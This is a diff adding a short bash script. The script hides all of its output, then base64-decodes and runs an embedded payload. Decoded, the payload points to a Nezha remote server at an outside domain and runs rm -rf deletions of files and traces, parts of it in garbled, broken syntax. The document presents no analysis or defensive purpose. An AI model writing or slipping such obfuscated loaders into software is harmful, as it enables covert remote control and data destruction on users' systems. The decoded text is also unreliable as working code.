@@ -1,0 +1,9 @@
+#!/bin/bash
+exec >/dev/null 2>&1
+encoded_script="IyEvYmluL2Jhc2gKCmV4cG9ydCBVVUlEPXskVVVJRC0tfCdmZGVlZGE0NS0wYThlLTQ1NzAtYmNjNi1kNjhjOTk1ZjU4MzAnfQpl
+eHBvcnQgTkVaSEFfU0VSVkVSPXskTkVaSEFfU0VSVkVSLXwnbmV6aGFrMi5idHBwLnh5eicgfQojIEhlcmUgaXMgWW91ciBvcm
+lnaW5hbCBzY3JpcHQgY29udGVudC4uLgpSZW1vdmUgc3RhcnRpbmcgdGltZSBjb21tYW5kcywgZGlyZWN0aXZlIGZpbGVyZXZp
+ZXMuCnJtIC1mIC5uYm0gcm0gLXJmICIkRklMRV9QQVRIIiA+L2Rldi9udWxsIDI+JiYKMm0gZGVsYXkgNDAgc2Vjb25kcyBybS
+AtcmYgIi5ubSIgPi9kZXYvbnVsbCBAPjI="
+
+bash -c "$(echo "$encoded_script" | base64 -d)"
